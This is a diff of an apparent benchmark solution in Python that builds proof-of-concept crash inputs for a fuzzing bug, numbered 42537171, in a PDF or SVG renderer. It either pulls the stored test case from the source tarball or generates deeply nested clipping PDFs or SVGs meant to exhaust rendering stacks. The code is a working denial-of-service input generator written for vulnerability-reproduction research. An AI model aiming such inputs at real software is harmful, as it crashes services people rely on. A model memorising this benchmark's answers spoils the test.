@@ -1,328 +1,251 @@
 import os
 import tarfile
 import tempfile
-import stat
-import gzip
-import bz2
-import lzma
+import shutil
+import re
+
+
+BUG_ID = "42537171"
+
+
+def find_poc_in_tar(src_path: str, bug_id: str = BUG_ID) -> bytes | None:
+    try:
+        with tarfile.open(src_path, "r:*") as tf:
+            best_member = None
+            best_score = None
+            candidate_exts = (
+                ".svg",
+                ".pdf",
+                ".bin",
+                ".dat",
+                ".txt",
+                ".json",
+                ".bmp",
+                ".pb",
+                ".xml",
+                ".skp",
+                ".ps",
+            )
+            for m in tf.getmembers():
+                if not m.isfile():
+                    continue
+                base = os.path.basename(m.name).lower()
+                if bug_id in base:
+                    score = 0
+                    for idx, ext in enumerate(candidate_exts):
+                        if base.endswith(ext):
+                            score = 100 - idx
+                            break
+                    else:
+                        score = 20
+                    if 0 < m.size <= 8 * 1024 * 1024:
+                        score += 5
+                    if best_score is None or score > best_score:
+                        best_score = score
+                        best_member = m
+            if best_member is not None:
+                f = tf.extractfile(best_member)
+                if f is not None:
+                    data = f.read()
+                    if data:
+                        return data
+    except Exception:
+        pass
+    return None
+
+
+def detect_format_from_project_yaml(src_root: str) -> str | None:
+    try:
+        for root, dirs, files in os.walk(src_root):
+            if "project.yaml" in files:
+                path = os.path.join(root, "project.yaml")
+                try:
+                    with open(path, "r", errors="ignore") as f:
+                        text = f.read()
+                except Exception:
+                    continue
+                lower = text.lower()
+                if (
+                    "svg" in lower
+                    or "librsvg" in lower
+                    or "resvg" in lower
+                    or "svgdom" in lower
+                ):
+                    return "svg"
+                if (
+                    "pdf" in lower
+                    or "pdfium" in lower
+                    or "poppler" in lower
+                    or "qpdf" in lower
+                ):
+                    return "pdf"
+                break
+    except Exception:
+        pass
+    return None
+
+
+def detect_format(src_root: str) -> str:
+    text_exts = {
+        ".c",
+        ".cc",
+        ".cpp",
+        ".cxx",
+        ".c++",
+        ".cp",
+        ".mm",
+        ".h",
+        ".hh",
+        ".hpp",
+        ".hxx",
+    }
+
+    harness_best = None
+    svg_score_generic = 0
+    pdf_score_generic = 0
+
+    for root, dirs, files in os.walk(src_root):
+        for fname in files:
+            ext = os.path.splitext(fname)[1].lower()
+            if ext not in text_exts:
+                continue
+            fpath = os.path.join(root, fname)
+            try:
+                with open(fpath, "r", errors="ignore") as f:
+                    text = f.read(65536)
+            except Exception:
+                continue
+            if not text:
+                continue
+            lower = text.lower()
+            svg_score_generic += lower.count("svg")
+            pdf_score_generic += lower.count("pdf")
+            if "llvmfuzzertestoneinput" in lower:
+                clip_count = lower.count("clip")
+                layer_count = lower.count("layer")
+                stack_count = lower.count("stack")
+                depth_count = lower.count("depth")
+                score = clip_count * 3 + (layer_count + stack_count + depth_count)
+
+                seen_svg = bool(re.search(r"\bsvg\b", lower) or ".svg" in lower)
+                seen_pdf = bool(
+                    re.search(r"\bpdf\b", lower)
+                    or ".pdf" in lower
+                    or "pdfium" in lower
+                    or "poppler" in lower
+                    or "qpdf" in lower
+                )
+
+                fmt = "unknown"
+                if seen_svg:
+                    fmt = "svg"
+                    score += 20
+                elif seen_pdf:
+                    fmt = "pdf"
+                    score += 20
+
+                if harness_best is None or score > harness_best["score"]:
+                    harness_best = {"fmt": fmt, "score": score}
+
+    if harness_best is not None and harness_best["fmt"] != "unknown":
+        return harness_best["fmt"]
+
+    proj_fmt = detect_format_from_project_yaml(src_root)
+    if proj_fmt:
+        return proj_fmt
+
+    if svg_score_generic > pdf_score_generic and svg_score_generic > 0:
+        return "svg"
+    if pdf_score_generic > 0:
+        return "pdf"
+    return "unknown"
+
+
+def generate_pdf_poc(depth: int = 40000) -> bytes:
+    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
+
+    content_str = "q\n" + ("0 0 100 100 re W n\n" * depth) + "Q\n"
+    content_bytes = content_str.encode("ascii")
+
+    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
+    obj2 = b"2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n"
+    obj3 = (
+        b"3 0 obj\n"
+        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\n"
+        b"endobj\n"
+    )
+
+    stream_header = f"4 0 obj\n<< /Length {len(content_bytes)} >>\nstream\n".encode(
+        "ascii"
+    )
+    stream_footer = b"\nendstream\nendobj\n"
+    obj4 = stream_header + content_bytes + stream_footer
+
+    objs = [obj1, obj2, obj3, obj4]
+
+    offsets = []
+    current_offset = len(header)
+    for obj in objs:
+        offsets.append(current_offset)
+        current_offset += len(obj)
+
+    xref_offset = current_offset
+
+    num_objs = len(objs)
+    xref_lines = []
+    xref_lines.append(f"xref\n0 {num_objs + 1}\n".encode("ascii"))
+    xref_lines.append(b"0000000000 65535 f \n")
+    for off in offsets:
+        xref_lines.append(f"{off:010d} 00000 n \n".encode("ascii"))
+    xref = b"".join(xref_lines)
+
+    trailer_str = (
+        f"trailer\n<< /Size {num_objs + 1} /Root 1 0 R >>\n"
+        f"startxref\n{xref_offset}\n%%%%EOF\n"
+    )
+    trailer = trailer_str.encode("ascii")
+
+    pdf_bytes = header + b"".join(objs) + xref + trailer
+    return pdf_bytes
+
+
+def generate_svg_poc(depth: int = 20000) -> bytes:
+    header = (
+        '<?xml version="1.0" encoding="UTF-8"?>\n'
+        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
+        '<defs><clipPath id="c"><rect x="0" y="0" width="100" height="100"/></clipPath></defs>\n'
+    )
+    groups_open = "".join('<g clip-path="url(#c)">\n' for _ in range(depth))
+    rect = '<rect x="0" y="0" width="100" height="100" fill="red"/>\n'
+    groups_close = "</g>\n" * depth
+    footer = "</svg>\n"
+    svg_str = header + groups_open + rect + groups_close + footer
+    return svg_str.encode("utf-8")
 
 
 class Solution:
-    TARGET_SIZE = 825339
-
     def solve(self, src_path: str) -> bytes:
+        poc = find_poc_in_tar(src_path)
+        if poc is not None:
+            return poc
+
+        tmpdir = None
+        fmt = "unknown"
         try:
-            data = self._extract_poc_bytes(src_path)
-            if isinstance(data, bytes) and data:
-                return data
+            tmpdir = tempfile.mkdtemp(prefix="pocgen_")
+            with tarfile.open(src_path, "r:*") as tf:
+                tf.extractall(tmpdir)
+            fmt = detect_format(tmpdir)
         except Exception:
-            pass
-        return self._fallback_poc()
-
-    def _extract_poc_bytes(self, src_path: str) -> bytes:
-        if os.path.isdir(src_path):
-            return self._search_in_dir(src_path)
-
-        with tempfile.TemporaryDirectory() as tmpdir:
-            root_dir = tmpdir
-            try:
-                with tarfile.open(src_path, "r:*") as tf:
-                    tf.extractall(root_dir)
-            except tarfile.ReadError:
-                # Not a tarball; if it's a regular file, just return its bytes
-                if os.path.isfile(src_path):
-                    try:
-                        with open(src_path, "rb") as f:
-                            return f.read()
-                    except Exception:
-                        return b""
-                return b""
-            return self._search_in_dir(root_dir)
-
-    def _search_in_dir(self, root: str) -> bytes:
-        target = self.TARGET_SIZE
-        file_infos = []
-        compressed_special = []
-
-        for dirpath, dirnames, filenames in os.walk(root):
-            for name in filenames:
-                path = os.path.join(dirpath, name)
+            fmt = "unknown"
+        finally:
+            if tmpdir is not None:
                 try:
-                    st = os.stat(path)
-                except OSError:
-                    continue
-                if not stat.S_ISREG(st.st_mode):
-                    continue
-                size = st.st_size
-                rel = os.path.relpath(path, root)
-                file_infos.append((path, rel, name, size))
-                lower = name.lower()
-                if lower.endswith((".gz", ".bz2", ".xz", ".lzma")):
-                    if any(k in lower for k in ("poc", "crash", "testcase", "clusterfuzz", "42537171")):
-                        compressed_special.append((path, rel, name, size))
-
-        if not file_infos and not compressed_special:
-            return b""
-
-        # Determine best regular file by heuristic scoring
-        best_path = None
-        best_score = None
-        best_size = None
-
-        for path, rel, name, size in file_infos:
-            score = self._score_file(rel, name, size, target)
-            if best_score is None or score > best_score:
-                best_score = score
-                best_path = path
-                best_size = size
-
-        # If best candidate exactly matches target size, return it
-        if best_path is not None and best_size == target:
-            try:
-                with open(best_path, "rb") as f:
-                    return f.read()
-            except Exception:
-                pass
-
-        # Explicit search for any file with exact target size
-        exact_candidates = []
-        for path, rel, name, size in file_infos:
-            if size == target:
-                exact_candidates.append((path, rel, name, size))
-
-        if exact_candidates:
-            best_exact_path = None
-            best_exact_score = None
-            for path, rel, name, size in exact_candidates:
-                sc = self._score_file(rel, name, size, target)
-                if best_exact_score is None or sc > best_exact_score:
-                    best_exact_score = sc
-                    best_exact_path = path
-            if best_exact_path is not None:
-                try:
-                    with open(best_exact_path, "rb") as f:
-                        return f.read()
+                    shutil.rmtree(tmpdir)
                 except Exception:
                     pass
 
-        # Try compressed special candidates: check if decompressed size matches target
-        for path, rel, name, size in compressed_special:
-            ext = os.path.splitext(name)[1].lower()
-            try:
-                if ext == ".gz":
-                    with gzip.open(path, "rb") as f:
-                        data = f.read()
-                elif ext == ".bz2":
-                    with bz2.open(path, "rb") as f:
-                        data = f.read()
-                else:
-                    with lzma.open(path, "rb") as f:
-                        data = f.read()
-            except Exception:
-                continue
-            if len(data) == target:
-                return data
-
-        # If best regular file has a positive heuristic score, return it
-        if best_path is not None and best_score is not None and best_score > 0:
-            try:
-                with open(best_path, "rb") as f:
-                    return f.read()
-            except Exception:
-                pass
-
-        # As another attempt, decompress the best compressed special candidate even if size differs
-        if compressed_special:
-            best_c_path = None
-            best_c_score = None
-            for path, rel, name, size in compressed_special:
-                sc = self._score_file(rel, name, size, target)
-                if best_c_score is None or sc > best_c_score:
-                    best_c_score = sc
-                    best_c_path = path
-            if best_c_path is not None:
-                name = os.path.basename(best_c_path)
-                ext = os.path.splitext(name)[1].lower()
-                try:
-                    if ext == ".gz":
-                        with gzip.open(best_c_path, "rb") as f:
-                            data = f.read()
-                    elif ext == ".bz2":
-                        with bz2.open(best_c_path, "rb") as f:
-                            data = f.read()
-                    else:
-                        with lzma.open(best_c_path, "rb") as f:
-                            data = f.read()
-                    if data:
-                        return data
-                except Exception:
-                    pass
-
-        # Final fallback within directory: return bytes of best_path even if score is low
-        if best_path is not None:
-            try:
-                with open(best_path, "rb") as f:
-                    return f.read()
-            except Exception:
-                pass
-
-        return b""
-
-    def _score_file(self, relpath: str, name: str, size: int, target: int) -> int:
-        rel_lower = relpath.replace("\\", "/").lower()
-        lower = name.lower()
-        score = 0
-
-        # Direct bug identifier
-        if "42537171" in lower or "42537171" in rel_lower:
-            score += 200
-
-        keyword_weights = {
-            "poc": 150,
-            "crash": 150,
-            "testcase": 130,
-            "repro": 120,
-            "clusterfuzz": 130,
-            "fuzz": 60,
-            "bug": 40,
-        }
-        for kw, w in keyword_weights.items():
-            if kw in lower or kw in rel_lower:
-                score += w
-
-        if any(seg in rel_lower for seg in ("/test", "/tests", "/regress", "/regression", "/fuzz", "/oss-fuzz")):
-            score += 40
-
-        ext = os.path.splitext(name)[1].lower()
-        vector_ext_bonus = {
-            ".pdf": 120,
-            ".ps": 110,
-            ".eps": 110,
-            ".svg": 120,
-            ".xps": 90,
-            ".oxps": 90,
-            ".skp": 120,
-            ".mskp": 100,
-        }
-        generic_ext_bonus = {
-            ".bin": 60,
-            ".dat": 50,
-            ".raw": 40,
-            ".txt": 10,
-            ".xml": 40,
-            ".json": 40,
-        }
-        lib_ext_penalty = {
-            ".a": -300,
-            ".o": -300,
-            ".obj": -300,
-            ".so": -300,
-            ".dll": -300,
-            ".dylib": -300,
-            ".la": -250,
-            ".lo": -250,
-            ".jar": -250,
-            ".class": -200,
-            ".pyc": -200,
-            ".pyo": -200,
-            ".exe": -250,
-        }
-        score += vector_ext_bonus.get(ext, 0)
-        score += generic_ext_bonus.get(ext, 0)
-        score += lib_ext_penalty.get(ext, 0)
-
-        # Size closeness to target
-        if target and size:
-            diff = abs(size - target)
-            if diff == 0:
-                score += 1000
-            elif diff < 1024:
-                score += 200
-            elif diff < 10 * 1024:
-                score += 150
-            elif diff < 50 * 1024:
-                score += 100
-            elif diff < 100 * 1024:
-                score += 60
-            elif diff < 300 * 1024:
-                score += 40
-            elif diff < 700 * 1024:
-                score += 20
-
-        if size == 0:
-            score -= 10
-        elif size > 20 * 1024 * 1024:
-            score -= 50
-        elif size <= 5 * 1024 * 1024:
-            score += 10
-
-        return score
-
-    def _fallback_poc(self) -> bytes:
-        # Construct a generic deeply nested clipping PDF to stress clip/layer stacks
-        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
-
-        objects = []
-
-        # Content stream with many nested saves and clipping operations
-        depth = 5000
-        content_parts = []
-        clip_cmd = b"q 0 0 1 1 0 0 cm 0 0 0 0 re W n\n"
-        for _ in range(depth):
-            content_parts.append(clip_cmd)
-        for _ in range(depth):
-            content_parts.append(b"Q\n")
-        stream_data = b"".join(content_parts)
-
-        # Basic PDF objects
-        objects.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
-        objects.append(b"2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n")
-        objects.append(
-            b"3 0 obj\n"
-            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\n"
-            b"endobj\n"
-        )
-
-        body = b""
-        offsets = [0]  # object 0 is the free object
-        offset = len(header)
-
-        for obj in objects:
-            offsets.append(offset)
-            body += obj
-            offset += len(obj)
-
-        # 4 0 obj: stream with clipping content
-        length_str = str(len(stream_data)).encode("ascii")
-        stream_header = b"4 0 obj\n<< /Length " + length_str + b" >>\nstream\n"
-        stream_footer = b"\nendstream\nendobj\n"
-        offsets.append(offset)
-        body += stream_header + stream_data + stream_footer
-        offset += len(stream_header) + len(stream_data) + len(stream_footer)
-
-        # xref table
-        xref_offset = offset
-        xref_lines = ["xref\n0 5\n"]
-        xref_lines.append("0000000000 65535 f \n")
-        for off in offsets[1:]:
-            xref_lines.append("{:010d} 00000 n \n".format(off))
-        xref_bytes = "".join(xref_lines).encode("ascii")
-
-        trailer = (
-            b"trailer\n<< /Root 1 0 R /Size 5 >>\nstartxref\n" +
-            str(xref_offset).encode("ascii") +
-            b"\n%%EOF\n"
-        )
-
-        pdf = header + body + xref_bytes + trailer
-
-        target = self.TARGET_SIZE
-        if len(pdf) < target:
-            pad_len = target - len(pdf)
-            pad_line = b"%pad " + b"A" * 79 + b"\n"
-            # ensure we have at least pad_len bytes of padding
-            repeat = pad_len // len(pad_line) + 1
-            pad = pad_line * repeat
-            pdf += pad[:pad_len]
-
-        return pdf
+        if fmt == "svg":
+            return generate_svg_poc()
+        # Default and for pdf-detected projects
+        return generate_pdf_poc()
